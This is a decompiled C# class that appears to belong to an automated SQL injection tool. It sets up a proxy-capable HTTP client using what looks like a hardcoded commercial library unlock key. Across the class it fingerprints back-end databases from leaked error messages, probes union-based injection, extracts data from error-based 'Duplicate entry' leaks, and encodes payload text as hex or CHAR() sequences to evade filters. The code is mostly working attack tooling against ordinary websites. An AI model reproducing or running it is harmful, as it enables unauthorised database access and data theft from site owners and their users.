using System;
using System.Collections.Generic;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Web;
using Chilkat;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

namespace DUX4
{
	// Token: 0x02000114 RID: 276
	[Obfuscation(Exclude = true, ApplyToMembers = true)]
	[Serializable]
	public class Main : MarshalByRefObject
	{
		// Token: 0x17000558 RID: 1368
		// (get) Token: 0x0600116A RID: 4458 RVA: 0x0000936E File Offset: 0x0000756E
		// (set) Token: 0x0600116B RID: 4459 RVA: 0x00009376 File Offset: 0x00007576
		private int __TimeOut { get; set; }

		// Token: 0x17000559 RID: 1369
		// (get) Token: 0x0600116C RID: 4460 RVA: 0x0000937F File Offset: 0x0000757F
		// (set) Token: 0x0600116D RID: 4461 RVA: 0x00009387 File Offset: 0x00007587
		private bool __FollowRedirects { get; set; }

		// Token: 0x1700055A RID: 1370
		// (get) Token: 0x0600116E RID: 4462 RVA: 0x00009390 File Offset: 0x00007590
		// (set) Token: 0x0600116F RID: 4463 RVA: 0x00009398 File Offset: 0x00007598
		private string __UserAgent { get; set; }

		// Token: 0x1700055B RID: 1371
		// (get) Token: 0x06001170 RID: 4464 RVA: 0x000093A1 File Offset: 0x000075A1
		// (set) Token: 0x06001171 RID: 4465 RVA: 0x000093A9 File Offset: 0x000075A9
		private string __Accept { get; set; }

		// Token: 0x1700055C RID: 1372
		// (get) Token: 0x06001172 RID: 4466 RVA: 0x000093B2 File Offset: 0x000075B2
		// (set) Token: 0x06001173 RID: 4467 RVA: 0x000093BA File Offset: 0x000075BA
		private int __Status { get; set; }

		// Token: 0x1700055D RID: 1373
		// (get) Token: 0x06001174 RID: 4468 RVA: 0x000093C3 File Offset: 0x000075C3
		// (set) Token: 0x06001175 RID: 4469 RVA: 0x000093CB File Offset: 0x000075CB
		private long __ContextSize { get; set; }

		// Token: 0x1700055E RID: 1374
		// (get) Token: 0x06001176 RID: 4470 RVA: 0x000093D4 File Offset: 0x000075D4
		// (set) Token: 0x06001177 RID: 4471 RVA: 0x000093DC File Offset: 0x000075DC
		private bool __WasRedirected { get; set; }

		// Token: 0x1700055F RID: 1375
		// (get) Token: 0x06001178 RID: 4472 RVA: 0x000093E5 File Offset: 0x000075E5
		// (set) Token: 0x06001179 RID: 4473 RVA: 0x000093ED File Offset: 0x000075ED
		private byte __PorxyType { get; set; }

		// Token: 0x17000560 RID: 1376
		// (get) Token: 0x0600117A RID: 4474 RVA: 0x000093F6 File Offset: 0x000075F6
		// (set) Token: 0x0600117B RID: 4475 RVA: 0x000093FE File Offset: 0x000075FE
		private string __PorxyUser { get; set; }

		// Token: 0x17000561 RID: 1377
		// (get) Token: 0x0600117C RID: 4476 RVA: 0x00009407 File Offset: 0x00007607
		// (set) Token: 0x0600117D RID: 4477 RVA: 0x0000940F File Offset: 0x0000760F
		private string __PorxyPass { get; set; }

		// Token: 0x17000562 RID: 1378
		// (get) Token: 0x0600117E RID: 4478 RVA: 0x00009418 File Offset: 0x00007618
		// (set) Token: 0x0600117F RID: 4479 RVA: 0x00009420 File Offset: 0x00007620
		private string __PorxyHost { get; set; }

		// Token: 0x17000563 RID: 1379
		// (get) Token: 0x06001180 RID: 4480 RVA: 0x00009429 File Offset: 0x00007629
		// (set) Token: 0x06001181 RID: 4481 RVA: 0x00009431 File Offset: 0x00007631
		private int __PorxyPort { get; set; }

		// Token: 0x17000564 RID: 1380
		// (get) Token: 0x06001182 RID: 4482 RVA: 0x0000943A File Offset: 0x0000763A
		// (set) Token: 0x06001183 RID: 4483 RVA: 0x00009442 File Offset: 0x00007642
		private int __TotalCall { get; set; }

		// Token: 0x17000565 RID: 1381
		// (get) Token: 0x06001184 RID: 4484 RVA: 0x0000944B File Offset: 0x0000764B
		// (set) Token: 0x06001185 RID: 4485 RVA: 0x00009453 File Offset: 0x00007653
		private long __TotalSize { get; set; }

		// Token: 0x17000566 RID: 1382
		// (get) Token: 0x06001186 RID: 4486 RVA: 0x0000945C File Offset: 0x0000765C
		// (set) Token: 0x06001187 RID: 4487 RVA: 0x00009464 File Offset: 0x00007664
		private bool __AcceptCookies { get; set; }

		// Token: 0x17000567 RID: 1383
		// (get) Token: 0x06001188 RID: 4488 RVA: 0x0000946D File Offset: 0x0000766D
		// (set) Token: 0x06001189 RID: 4489 RVA: 0x00009475 File Offset: 0x00007675
		private bool __Abort { get; set; }

		// Token: 0x17000568 RID: 1384
		// (get) Token: 0x0600118A RID: 4490 RVA: 0x0000947E File Offset: 0x0000767E
		// (set) Token: 0x0600118B RID: 4491 RVA: 0x00009486 File Offset: 0x00007686
		private string __LoginUser { get; set; }

		// Token: 0x17000569 RID: 1385
		// (get) Token: 0x0600118C RID: 4492 RVA: 0x0000948F File Offset: 0x0000768F
		// (set) Token: 0x0600118D RID: 4493 RVA: 0x00009497 File Offset: 0x00007697
		private string __LoginPassword { get; set; }

		// Token: 0x1700056A RID: 1386
		// (get) Token: 0x0600118E RID: 4494 RVA: 0x000094A0 File Offset: 0x000076A0
		// (set) Token: 0x0600118F RID: 4495 RVA: 0x000094A8 File Offset: 0x000076A8
		private Main.eWebServer __WebServer { get; set; }

		// Token: 0x06001190 RID: 4496 RVA: 0x00079BF8 File Offset: 0x00077DF8
		public Main()
		{
			this.__FollowRedirects = true;
			this.__UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0";
			this.__Accept = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8";
			this.__PorxyType = 0;
			this.__PorxyUser = string.Empty;
			this.__PorxyPass = string.Empty;
			this.__PorxyHost = string.Empty;
			this.__PorxyPort = 0;
			this.__Abort = false;
			this.__LoginUser = "";
			this.__LoginPassword = "";
			this.__HTTP = new Http();
			if (!this.__HTTP.IsUnlocked())
			{
				this.__HTTP.UnlockComponent("nI5uv4Http_5KMVwkSiNmAR");
			}
			this.__HTTP.ConnectTimeout = 10;
			this.__HTTP.ReadTimeout = 10;
			this.__HTTP.MaxResponseSize = 5242880U;
			this.__HTTP.FollowRedirects = true;
			this.__HTTP.AutoAddHostHeader = true;
			this.__HTTP.AllowGzip = true;
			this.__HTTP.SendCookies = true;
			this.__HTTP.SaveCookies = true;
			this.__HTTP.CookieDir = "memory";
			this.__HTTP.UseIEProxy = false;
			this.__HTTP.MaxConnections = 100;
			this.__HTTP.MaxResponseSize = 5242880U;
			this.__HTTP.EnableEvents = true;
			this.__HTTP.KeepEventLog = false;
			this.__HTTP.OnReceiveRate += this.OnReceiveRate;
			this.__HTTP.OnPercentDone += this.OnPercentDone;
		}

		// Token: 0x06001191 RID: 4497 RVA: 0x000094B1 File Offset: 0x000076B1
		private void OnReceiveRate(object sender, DataRateEventArgs args)
		{
			this.__ContextSize = args.ByteCount;
		}

		// Token: 0x06001192 RID: 4498 RVA: 0x000094BF File Offset: 0x000076BF
		private void OnPercentDone(object sender, PercentDoneEventArgs args)
		{
			args.Abort = this.__Abort;
		}

		// Token: 0x06001193 RID: 4499 RVA: 0x00079D84 File Offset: 0x00077F84
		public int TotalCall()
		{
			try
			{
				return this.__TotalCall;
			}
			catch (Exception ex)
			{
				if (!(ex is ThreadAbortException))
				{
					Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
				}
			}
			return 0;
		}

		// Token: 0x06001194 RID: 4500 RVA: 0x000094CD File Offset: 0x000076CD
		public long TotalSize()
		{
			return this.__TotalSize;
		}

		// Token: 0x06001195 RID: 4501 RVA: 0x000094D5 File Offset: 0x000076D5
		public int WebServer()
		{
			return (int)this.__WebServer;
		}

		// Token: 0x06001196 RID: 4502 RVA: 0x000094DD File Offset: 0x000076DD
		public bool WasRedirected()
		{
			return this.__WasRedirected;
		}

		// Token: 0x06001197 RID: 4503 RVA: 0x000094E5 File Offset: 0x000076E5
		public int Status()
		{
			return this.__Status;
		}

		// Token: 0x06001198 RID: 4504 RVA: 0x000094ED File Offset: 0x000076ED
		public long ContextSize()
		{
			return this.__ContextSize;
		}

		// Token: 0x06001199 RID: 4505 RVA: 0x000094F5 File Offset: 0x000076F5
		public void SetAcceptCookies(bool b)
		{
			this.__AcceptCookies = b;
		}

		// Token: 0x0600119A RID: 4506 RVA: 0x000094FE File Offset: 0x000076FE
		public bool AddQuickHeader(string name, string value)
		{
			return this.__HTTP.AddQuickHeader(name, value);
		}

		// Token: 0x0600119B RID: 4507 RVA: 0x0000950D File Offset: 0x0000770D
		public void Abort()
		{
			this.__Abort = true;
		}

		// Token: 0x0600119C RID: 4508 RVA: 0x00079DD4 File Offset: 0x00077FD4
		private void CheckSetup(Http o)
		{
			o.ProxyDomain = "";
			o.ProxyLogin = "";
			o.ProxyPassword = "";
			o.ProxyPort = 0;
			o.SocksHostname = "";
			o.SocksUsername = "";
			o.SocksPassword = "";
			o.SocksPort = 0;
			o.SocksVersion = 0;
			byte _PorxyType = this.__PorxyType;
			if (_PorxyType != 0)
			{
				if (_PorxyType == 4 || _PorxyType == 5)
				{
					o.SocksHostname = this.__PorxyHost;
					o.SocksUsername = this.__PorxyUser;
					o.SocksPassword = this.__PorxyPass;
					o.SocksPort = this.__PorxyPort;
					o.SocksVersion = (int)this.__PorxyType;
				}
				else
				{
					o.ProxyDomain = this.__PorxyHost;
					o.ProxyLogin = this.__PorxyUser;
					o.ProxyPassword = this.__PorxyPass;
					o.ProxyPort = this.__PorxyPort;
				}
			}
			o.ConnectTimeout = this.__TimeOut;
			o.ReadTimeout = this.__TimeOut;
			o.FollowRedirects = this.__FollowRedirects;
			o.UserAgent = this.__UserAgent;
			o.Accept = this.__Accept;
			o.SendCookies = this.__AcceptCookies;
			o.SaveCookies = this.__AcceptCookies;
		}

		// Token: 0x0600119D RID: 4509 RVA: 0x00079F0C File Offset: 0x0007810C
		public void Dispose()
		{
			try
			{
				if (this.__HTTP != null)
				{
					this.__HTTP = null;
				}
			}
			catch (Exception ex)
			{
				if (!(ex is ThreadAbortException))
				{
					Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
				}
			}
		}

		// Token: 0x0600119E RID: 4510 RVA: 0x00079F60 File Offset: 0x00078160
		public void Setup(int timeOut, bool followRedirect, string userAgent, string accept, string login, string password, byte pType, string pHost, int pPort, string pUser, string pPass)
		{
			this.__TimeOut = timeOut;
			this.__FollowRedirects = followRedirect;
			this.__UserAgent = userAgent;
			this.__Accept = accept;
			this.__LoginUser = login;
			this.__LoginPassword = password;
			this.__PorxyType = pType;
			this.__PorxyHost = pHost;
			this.__PorxyPort = pPort;
			this.__PorxyUser = pUser;
			this.__PorxyPass = pPass;
		}

		// Token: 0x0600119F RID: 4511 RVA: 0x00079FC4 File Offset: 0x000781C4
		public string QuickPost(string url, Dictionary<string, string> post)
		{
			checked
			{
				try
				{
					this.CheckSetup(this.__HTTP);
					Chilkat.HttpResponse httpResponse = null;
					this.__HTTP.Referer = url;
					this.__TotalCall++;
					this.__ContextSize = 0L;
					this.__Status = 0;
					Chilkat.HttpRequest httpRequest = new Chilkat.HttpRequest();
					httpRequest.UsePost();
					httpRequest.SendCharset = true;
					try
					{
						foreach (KeyValuePair<string, string> keyValuePair in post)
						{
							httpRequest.AddParam(keyValuePair.Key, HttpUtility.UrlEncode(keyValuePair.Value));
						}
					}
					finally
					{
						Dictionary<string, string>.Enumerator enumerator;
						((IDisposable)enumerator).Dispose();
					}
					try
					{
						httpResponse = this.__HTTP.PostUrlEncoded(url, httpRequest);
					}
					catch (Exception ex)
					{
					}
					string text;
					if (httpResponse != null)
					{
						this.__Status = httpResponse.StatusCode;
						text = httpResponse.BodyStr;
						this.__WasRedirected = this.__HTTP.WasRedirected;
					}
					else
					{
						text = null;
					}
					if (text != null)
					{
						if (!string.IsNullOrEmpty(text))
						{
							if (this.__ContextSize > 0L)
							{
								this.__TotalSize += this.__ContextSize;
							}
							text = HttpUtility.HtmlDecode(text).Trim();
						}
						this.__WebServer = this.CheckWebServer();
					}
					return text;
				}
				catch (Exception ex2)
				{
					if (!(ex2 is ThreadAbortException))
					{
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
					}
				}
				return null;
			}
		}

		// Token: 0x060011A0 RID: 4512 RVA: 0x0007A168 File Offset: 0x00078368
		public string QuickGetIsolated(string url)
		{
			try
			{
				this.CheckSetup(this.__HTTP);
				return this.QuickGet(url, this.__HTTP);
			}
			catch (Exception ex)
			{
				if (!(ex is ThreadAbortException))
				{
					Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
				}
			}
			return null;
		}

		// Token: 0x060011A1 RID: 4513 RVA: 0x0007A1C8 File Offset: 0x000783C8
		public string QuickGet(string url, Http o)
		{
			checked
			{
				try
				{
					string text = null;
					o.Referer = url;
					this.__TotalCall++;
					this.__ContextSize = 0L;
					this.__Status = 0;
					if (this.__HTTP != o)
					{
						this.__HTTP = o;
					}
					this.__HTTP.Login = this.__LoginUser;
					this.__HTTP.Password = this.__LoginPassword;
					try
					{
						using (Chilkat.StringBuilder stringBuilder = new Chilkat.StringBuilder())
						{
							this.__HTTP.QuickGetSb(url, stringBuilder);
							text = stringBuilder.ToString();
						}
					}
					catch (Exception ex)
					{
					}
					this.__Status = this.__HTTP.LastStatus;
					this.__WasRedirected = this.__HTTP.WasRedirected;
					if (text != null)
					{
						if (!string.IsNullOrEmpty(text))
						{
							if (this.__ContextSize > 0L)
							{
								this.__TotalSize += this.__ContextSize;
							}
							text = HttpUtility.HtmlDecode(text).Trim();
						}
						this.__WebServer = this.CheckWebServer();
					}
					return text;
				}
				catch (Exception ex2)
				{
					if (!(ex2 is ThreadAbortException))
					{
						Interaction.MsgBox(ex2.Message, MsgBoxStyle.OkOnly, null);
					}
				}
				return null;
			}
		}

		// Token: 0x060011A2 RID: 4514 RVA: 0x0007A31C File Offset: 0x0007851C
		public bool CheckKeyword(string url, string Keyword)
		{
			try
			{
				string text = this.QuickGetIsolated(url);
				if (!string.IsNullOrEmpty(text))
				{
					text = text.ToLower();
					Keyword = Keyword.ToLower();
					string value = HttpUtility.HtmlEncode(Keyword);
					return text.Contains(Keyword.ToLower()) || text.Contains(value);
				}
			}
			catch (Exception ex)
			{
				if (!(ex is ThreadAbortException))
				{
					Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
				}
			}
			return false;
		}

		// Token: 0x060011A3 RID: 4515 RVA: 0x0007A3A4 File Offset: 0x000785A4
		public int TryUnionBasead(string url, string key, int DBType)
		{
			string text = this.QuickGetIsolated(url);
			int result;
			if (!string.IsNullOrEmpty(text))
			{
				if (text.Contains(key))
				{
					result = this.CheckUnionColumn(text, key);
				}
				else
				{
					result = -1;
				}
			}
			else
			{
				result = -2;
			}
			return result;
		}

		// Token: 0x060011A4 RID: 4516 RVA: 0x0007A3E4 File Offset: 0x000785E4
		public int CheckSyntaxError(string url)
		{
			string text = this.QuickGetIsolated(url);
			int result;
			if (string.IsNullOrEmpty(text))
			{
				result = 0;
			}
			else
			{
				text = text.ToLower();
				bool flag = true;
				if (flag == text.IndexOf("Dork SQL Injection".ToLower()) >= 0 || flag == text.IndexOf("SQL Dork".ToLower()) >= 0 || flag == text.IndexOf("Dorks".ToLower()) >= 0 || flag == text.IndexOf("SQL Injection".ToLower()) >= 0)
				{
					result = 0;
				}
				else
				{
					bool flag2 = true;
					if (flag2 == text.IndexOf("mysql_num_rows()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_array()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_result()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_query()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_assoc()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_numrows()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_row()".ToLower()) >= 0 || flag2 == text.IndexOf("mysql_fetch_object()".ToLower()) >= 0 || flag2 == text.IndexOf("JDBC MySQL()".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL Driver".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL Error".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL ODBC".ToLower()) >= 0 || flag2 == text.IndexOf("on MySQL result index".ToLower()) >= 0 || flag2 == text.IndexOf("supplied argument is not a valid MySQL result resource".ToLower()) >= 0 || flag2 == text.IndexOf("MySQL server version for the right syntax to use near".ToLower()) >= 0 || flag2 == text.IndexOf("Driver][mysqld".ToLower()) >= 0 || flag2 == (text.IndexOf("Duplicate entry".ToLower()) >= 0 && text.IndexOf("for key 'PRIMARY'".ToLower()) >= 0))
					{
						result = 2;
					}
					else if (flag2 == text.IndexOf("Microsoft OLE DB Provider for ODBC Drivers error".ToLower()) >= 0 || flag2 == text.IndexOf("[Microsoft][ODBC SQL Server Driver][SQL Server]".ToLower()) >= 0 || flag2 == text.IndexOf("ODBC Drivers error '80040e14'".ToLower()) >= 0 || flag2 == text.IndexOf("ODBC SQL Server Driver".ToLower()) >= 0 || flag2 == text.IndexOf("JDBC SQL".ToLower()) >= 0 || flag2 == text.IndexOf("Microsoft OLE DB Provider for SQL Server".ToLower()) >= 0 || flag2 == text.IndexOf("Unclosed quotation mark".ToLower()) >= 0 || flag2 == text.IndexOf("VBScript Runtime".ToLower()) >= 0 || flag2 == text.IndexOf("SQLServer JDBC Driver".ToLower()) >= 0)
					{
						result = 5;
					}
					else if (flag2 == text.IndexOf("ORA-0".ToLower()) >= 0 || flag2 == text.IndexOf("ORA-1".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle DB2".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle Driver".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle Error".ToLower()) >= 0 || flag2 == text.IndexOf("Oracle ODBC".ToLower()) >= 0 || flag2 == text.IndexOf("MM_XSLTransform error".ToLower()) >= 0 || flag2 == text.IndexOf("[Macromedia][Oracle JDBC Driver][Oracle]ORA-".ToLower()) >= 0 || flag2 == text.IndexOf("ociexecute(): OCIStmtExecute:".ToLower()) >= 0 || flag2 == text.IndexOf("ORA-1".ToLower()) >= 0)
					{
						result = 8;
					}
					else if (flag2 == (text.IndexOf("[Microsoft][ODBC Microsoft Access Driver]".ToLower()) >= 0 & text.IndexOf("WHERE".ToLower()) <= 0) || flag2 == (text.IndexOf("ODBC Microsoft Access Driver".ToLower()) >= 0 & text.IndexOf("WHERE".ToLower()) <= 0) || flag2 == text.IndexOf("ocifetch(): OCIFetch:".ToLower()) >= 0)
					{
						result = 14;
					}
					else if (flag2 == text.IndexOf("Warning: pg_exec() ".ToLower()) >= 0 || flag2 == text.IndexOf("function.pg-exec".ToLower()) >= 0 || flag2 == text.IndexOf("target_user:target_db:PostgreSQL".ToLower()) >= 0 || flag2 == text.IndexOf("PostgreSQL query failed".ToLower()) >= 0 || flag2 == text.IndexOf("Supplied argument is not a valid PostgreSQL result".ToLower()) >= 0 || flag2 == text.IndexOf("pg_fetch_array()".ToLower()) >= 0 || flag2 == text.IndexOf("pg_query()".ToLower()) >= 0 || flag2 == text.IndexOf("pg_fetch_assoc()".ToLower()) >= 0 || flag2 == text.IndexOf("function.pg-query".ToLower()) >= 0)
					{
						result = 11;
					}
					else if (flag2 == text.IndexOf("com.sybase.jdbc2.jdbc.SybSQLException".ToLower()) >= 0 || flag2 == text.IndexOf("SybSQLException".ToLower()) >= 0)
					{
						result = 15;
					}
					else if (flag2 == text.IndexOf("Error Executing Database Query".ToLower()) >= 0 || flag2 == text.IndexOf("ADODB.Command".ToLower()) >= 0 || flag2 == text.IndexOf("BOF or EOF".ToLower()) >= 0 || flag2 == text.IndexOf("ADODB.Field".ToLower()) >= 0 || flag2 == text.IndexOf("sql error".ToLower()) >= 0 || flag2 == text.IndexOf("syntax error".ToLower()) >= 0 || flag2 == text.IndexOf("OLE DB Provider for ODBC".ToLower()) >= 0 || flag2 == text.IndexOf("ADODBCommand".ToLower()) >= 0 || flag2 == text.IndexOf("ADODBField".ToLower()) >= 0 || flag2 == text.IndexOf("A syntax error has occurred".ToLower()) >= 0 || flag2 == text.IndexOf("Custom Error Message".ToLower()) >= 0 || flag2 == text.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == text.IndexOf("Error Report".ToLower()) >= 0 || flag2 == text.IndexOf("Error converting data type varchar to numeric".ToLower()) >= 0 || flag2 == text.IndexOf("Incorrect syntax near".ToLower()) >= 0 || flag2 == text.IndexOf("SQL command not properly ended".ToLower()) >= 0 || flag2 == text.IndexOf("Types mismatch".ToLower()) >= 0 || flag2 == text.IndexOf("invalid query".ToLower()) >= 0 || flag2 == text.IndexOf("unexpected end of SQL command".ToLower()) >= 0 || flag2 == text.IndexOf("Unclosed quotation mark before the character string".ToLower()) >= 0 || flag2 == text.IndexOf("Unterminated string constant".ToLower()) >= 0 || flag2 == text.IndexOf("SQLException".ToLower()) >= 0 || flag2 == text.IndexOf("DBObject::doQuery".ToLower()) >= 0)
					{
						result = 1;
					}
					else
					{
						result = 0;
					}
				}
			}
			return result;
		}

		// Token: 0x060011A5 RID: 4517 RVA: 0x0007AC8C File Offset: 0x00078E8C
		public string ParseHtmlData(string url, int dbType, string splitStr)
		{
			checked
			{
				try
				{
					string text = "";
					string text2 = this.QuickGetIsolated(url);
					if (string.IsNullOrEmpty(text2))
					{
						return null;
					}
					if (dbType == 4 | dbType == 10)
					{
						int num = text2.ToLower().IndexOf("Duplicate entry".ToLower());
						if (num >= 0)
						{
							text2 = text2.Substring(num);
							text = text2.Substring(text2.IndexOf("'") + 1);
							if (text.ToLower().StartsWith(splitStr.ToLower()))
							{
								text = text.Substring(splitStr.Length);
								text = text.Substring(0, text.IndexOf("'"));
							}
							else
							{
								text = Strings.Split(text, splitStr, -1, CompareMethod.Binary)[0];
							}
						}
						else
						{
							num = text2.ToLower().IndexOf(splitStr.ToLower());
							if (num > 0)
							{
								text = text2.Substring(num + splitStr.Length);
							}
						}
						if (text.ToLower().IndexOf("for key".ToLower()) > 1 & text.IndexOf("'") > 1)
						{
							text = text.Substring(0, text.ToLower().IndexOf("for key"));
							text = text.Substring(0, text.LastIndexOf("'"));
						}
						if (text.ToLower().IndexOf(splitStr.ToLower()) > 0)
						{
							if (text.ToLower().StartsWith(splitStr.ToLower()))
							{
								text = Strings.Split(text, splitStr, -1, CompareMethod.Binary)[1];
							}
							else
							{
								text = Strings.Split(text, splitStr, -1, CompareMethod.Binary)[0];
							}
						}
						if (text.EndsWith("'11"))
						{
							text = text.Substring(0, text.Length - 3);
						}
						else if (text.EndsWith("'1"))
						{
							text = text.Substring(0, text.Length - 2);
						}
					}
					else
					{
						int num = text2.IndexOf(splitStr);
						if (num >= 0)
						{
							text = text2.Substring(num + splitStr.Length);
							if (text.StartsWith(splitStr))
							{
								text = " ";
							}
							else
							{
								num = text.IndexOf(splitStr);
								if (num > 0)
								{
									text = text.Substring(0, num);
								}
								else
								{
									int[] array = new int[]
									{
										text.IndexOf('<'),
										text.IndexOf('>'),
										text.IndexOf('"')
									};
									num = text.Length;
									foreach (int num2 in array)
									{
										if (num > num2 & num2 > 0)
										{
											num = num2;
										}
									}
									text = text.Substring(0, num);
								}
							}
						}
					}
					if (string.IsNullOrEmpty(text))
					{
						return null;
					}
					text = text.Trim();
					if (this.TypeIsMSSQL(dbType) && text.Contains("' to a column of data type int."))
					{
						text = text.Replace("' to a column of data type int.", "");
					}
					return text;
				}
				catch (Exception ex)
				{
					if (!(ex is ThreadAbortException))
					{
						Interaction.MsgBox(ex.Message, MsgBoxStyle.OkOnly, null);
					}
				}
				return null;
			}
		}

		// Token: 0x060011A6 RID: 4518 RVA: 0x00009516 File Offset: 0x00007716
		private bool TypeIsMSSQL(Main.Types t)
		{
			return t == Main.Types.MSSQL_No_Error | t == Main.Types.MSSQL_With_Error | t == Main.Types.MSSQL_Unknown;
		}

		// Token: 0x060011A7 RID: 4519 RVA: 0x0007AF6C File Offset: 0x0007916C
		private Main.eWebServer CheckWebServer()
		{
			Main.eWebServer result;
			if (this.__HTTP != null && !string.IsNullOrEmpty(this.__HTTP.LastResponseHeader))
			{
				if (this.__HTTP.LastResponseHeader.ToLower().Contains("iis") | this.__HTTP.LastResponseHeader.ToLower().Contains("microsoft"))
				{
					result = Main.eWebServer.WINDOWS;
				}
				else
				{
					result = Main.eWebServer.LINUX;
				}
			}
			else
			{
				result = this.__WebServer;
			}
			return result;
		}

		// Token: 0x060011A8 RID: 4520 RVA: 0x0007AFDC File Offset: 0x000791DC
		private int CheckUnionColumn(string hmtl, string sKeyword)
		{
			try
			{
				int num = hmtl.ToLower().IndexOf(sKeyword.ToLower());
				if (num > 0)
				{
					string text = hmtl.Substring(num);
					string text2 = text.Substring(sKeyword.Length, checked(text.IndexOf(".") - sKeyword.Length)).Trim();
					if (Versioned.IsNumeric(text2))
					{
						return Conversions.ToInteger(text2);
					}
				}
			}
			catch (Exception ex)
			{
			}
			return 0;
		}

		// Token: 0x060011A9 RID: 4521 RVA: 0x00009526 File Offset: 0x00007726
		private bool TypeIsMySQL(int t)
		{
			return t == 3 | t == 4 | t == 2;
		}

		// Token: 0x060011AA RID: 4522 RVA: 0x00009516 File Offset: 0x00007716
		private bool TypeIsMSSQL(int t)
		{
			return t == 6 | t == 7 | t == 5;
		}

		// Token: 0x060011AB RID: 4523 RVA: 0x00009536 File Offset: 0x00007736
		private bool TypeIsOracle(int t)
		{
			return t == 9 | t == 10 | t == 8;
		}

		// Token: 0x060011AC RID: 4524 RVA: 0x00009548 File Offset: 0x00007748
		private bool TypeIsPostgreSQL(int t)
		{
			return t == 12 | t == 13 | t == 11;
		}

		// Token: 0x060011AD RID: 4525 RVA: 0x0007B060 File Offset: 0x00079260
		private string ConvertTextToHex(string sText)
		{
			checked
			{
				string result;
				try
				{
					if (string.IsNullOrEmpty(sText))
					{
						result = "";
					}
					else
					{
						char[] chars = sText.ToCharArray();
						byte[] bytes = Encoding.ASCII.GetBytes(chars);
						string text = "";
						int num = bytes.Length - 1;
						for (int i = 0; i <= num; i++)
						{
							text += string.Format("{0:x2}", bytes[i]);
						}
						result = "0x" + text;
					}
				}
				catch (Exception ex)
				{
					result = sText;
				}
				return result;
			}
		}

		// Token: 0x060011AE RID: 4526 RVA: 0x0007B0F8 File Offset: 0x000792F8
		private string ConvertTextToSQLChar(string sText, bool bGroupChar, string sDelimiter = "+", string sChar = "char")
		{
			checked
			{
				string result;
				try
				{
					if (string.IsNullOrEmpty(sText))
					{
						result = "";
					}
					else
					{
						char[] chars = sText.ToCharArray();
						byte[] bytes = Encoding.ASCII.GetBytes(chars);
						string text = "";
						int num = bytes.Length - 1;
						for (int i = 0; i <= num; i++)
						{
							if (bGroupChar)
							{
								if (i == 0)
								{
									text = text + sChar + "(" + Convert.ToString(bytes[i]);
								}
								else
								{
									text = text + "," + Convert.ToString(bytes[i]);
								}
							}
							else if (i == 0)
							{
								text = string.Concat(new string[]
								{
									text,
									sChar,
									"(",
									Convert.ToString(bytes[i]),
									")"
								});
							}
							else
							{
								text = string.Concat(new string[]
								{
									text,
									sDelimiter,
									sChar,
									"(",
									Convert.ToString(bytes[i]),
									")"
								});
							}
						}
						if (bGroupChar)
						{
							text += ")";
						}
						result = text;
					}
				}
				catch (Exception ex)
				{
					result = "ERROR: " + ex.Message;
				}
				return result;
			}
		}

		// Token: 0x040008C8 RID: 2248
		private Http __HTTP;

		// Token: 0x02000115 RID: 277
		private enum Types
		{
			// Token: 0x040008DD RID: 2269
			None,
			// Token: 0x040008DE RID: 2270
			Unknown,
			// Token: 0x040008DF RID: 2271
			MySQL_Unknown,
			// Token: 0x040008E0 RID: 2272
			MySQL_No_Error,
			// Token: 0x040008E1 RID: 2273
			MySQL_With_Error,
			// Token: 0x040008E2 RID: 2274
			MSSQL_Unknown,
			// Token: 0x040008E3 RID: 2275
			MSSQL_No_Error,
			// Token: 0x040008E4 RID: 2276
			MSSQL_With_Error,
			// Token: 0x040008E5 RID: 2277
			Oracle_Unknown,
			// Token: 0x040008E6 RID: 2278
			Oracle_No_Error,
			// Token: 0x040008E7 RID: 2279
			Oracle_With_Error,
			// Token: 0x040008E8 RID: 2280
			PostgreSQL_Unknown,
			// Token: 0x040008E9 RID: 2281
			PostgreSQL_No_Error,
			// Token: 0x040008EA RID: 2282
			PostgreSQL_With_Error,
			// Token: 0x040008EB RID: 2283
			MsAccess,
			// Token: 0x040008EC RID: 2284
			Sybase
		}

		// Token: 0x02000116 RID: 278
		private enum eWebServer
		{
			// Token: 0x040008EE RID: 2286
			UNKNOW,
			// Token: 0x040008EF RID: 2287
			LINUX,
			// Token: 0x040008F0 RID: 2288
			WINDOWS
		}
	}
}
